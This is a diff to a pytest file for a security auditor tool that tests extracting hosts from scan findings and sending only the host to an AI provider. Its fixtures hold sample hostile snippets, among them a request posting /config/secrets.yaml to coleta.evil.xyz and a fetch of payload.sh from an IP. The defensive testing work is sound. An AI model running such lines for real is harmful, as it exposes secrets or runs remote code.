@@ -165,7 +165,7 @@ def test_page_button_only_when_configured():
                      ai={"label": "Claude", "modelo": "claude-opus-5-5"}, dns_ai=cached)
     assert 'data-dns-ai="outro.com"' in on and "Ask the AI" in on
     assert 'class="badge sev-critical"' in on and "AI: Malicious" in on
-    assert "Only the domain name is sent to Claude" in on
+    assert "Only the host (domain name or IP) is sent to Claude" in on
     # "Perguntar sobre todos" pula quem já tem resposta guardada.
     assert 'class="btn btn-ghost btn-sm dns-ai-all" data-provider="Claude">Ask the AI about all…' in on
     assert 'data-dns-ai="pool.supportxmr.com" data-ai-saved="1"' in on and 'data-dns-ai="outro.com">' in on
@@ -230,3 +230,69 @@ async def test_api_without_ai(aiohttp_client, tmp_path):
     token = html.split('name="csrf-token" content="')[1].split('"')[0]
     resp = await c.post("/api/dns/ia", headers={CSRF_HEADER: token}, json={"dominio": "a.com"})
     assert resp.status == 409
+
+
+# --- Hosts nos achados (URLs e IPs): só o host é enviado ------------------------------------
+
+
+@pytest.mark.parametrize("text, expected", [
+    ('get("https://user:senha@API.Evil.xyz:8443/coleta?token=abc123")', ["api.evil.xyz"]),
+    ('ws://8.8.8.8:53/x e "1.1.1.1"', ["8.8.8.8", "1.1.1.1"]),
+    ('"http://[2606:4700:4700::1111]/dns"', ["2606:4700:4700::1111"]),
+    # Rede local, documentação, nomes locais e lixo ficam de fora.
+    ('http://192.168.1.5/a 10.0.0.1 127.0.0.1 "203.0.113.7" http://homeassistant.local:8123 http://localhost',
+     []),
+    ('"https://1.2.3.4.5/x" "999.1.1.1" eval(input())', []),
+    ("https://a.com https://a.com/b https://b.com https://c.com https://d.com https://e.com https://f.com",
+     ["a.com", "b.com", "c.com", "d.com", "e.com"]),  # no máximo 5 por achado
+])
+def test_finding_hosts(text, expected):
+    from auditor.ai import finding_hosts
+
+    assert finding_hosts(text) == expected
+
+
+def test_finding_shows_ask_buttons_per_host():
+    from auditor.models import ScanResult
+    from auditor.report import render_html
+
+    from .conftest import make_finding
+
+    f = make_finding(snippet='requests.post("https://coleta.evil.xyz/up?key=123", data=open("/config/secrets.yaml"))')
+    result = ScanResult(scan_id="20261116T100000000000Z", started_at="2026-11-16T10:00:00+00:00", status="concluida",
+                        findings=[f])
+    ai_on = {"label": "Gemini", "modelo": "gemini-3.5-flash-lite"}
+    html = render_html(result, status={}, history=[], csrf_token="t", lang="en", ai=ai_on)
+    assert 'data-dns-ai="coleta.evil.xyz"' in html and "Ask the AI about coleta.evil.xyz" in html
+    assert "key=123" not in html.split('data-dns-ai="coleta.evil.xyz"')[1].split("</button>")[0]
+    off = render_html(result, status={}, history=[], csrf_token="t", lang="en")
+    assert 'data-dns-ai="coleta.evil.xyz"' not in off
+
+
+async def test_api_accepts_host_from_findings(aiohttp_client, paths, storage, masker):
+    from auditor.config import Options
+    from auditor.scheduler import Scheduler
+    from auditor.web import CSRF_HEADER, create_app
+
+    from .conftest import make_finding
+    from .test_engine_web import FakeScanner, _engine
+
+    engine = _engine(paths, storage, masker, Options(),
+                     [FakeScanner([make_finding(snippet='urlopen("http://45.33.32.156/payload.sh")')])])
+    await engine.run()
+    asked = []
+
+    async def ask(domain, lang):
+        asked.append(domain)
+        return {**ANSWER, "provedor": "gemini", "modelo": "gemini-3.5-flash-lite"}
+
+    app = create_app(storage, Scheduler(lambda: None, 0, False), {}, allowed_peers={ipaddress.ip_address("127.0.0.1")},
+                     ai={"label": "Gemini", "modelo": "gemini-3.5-flash-lite", "ask": ask})
+    c = await aiohttp_client(app)
+    html = await (await c.get("/")).text()
+    token = html.split('name="csrf-token" content="')[1].split('"')[0]
+    resp = await c.post("/api/dns/ia", headers={CSRF_HEADER: token}, json={"dominio": "45.33.32.156"})
+    assert resp.status == 200 and asked == ["45.33.32.156"]
+    # Um host que não está nos achados nem no DNS continua recusado.
+    resp = await c.post("/api/dns/ia", headers={CSRF_HEADER: token}, json={"dominio": "8.8.4.4"})
+    assert resp.status == 404 and len(asked) == 1
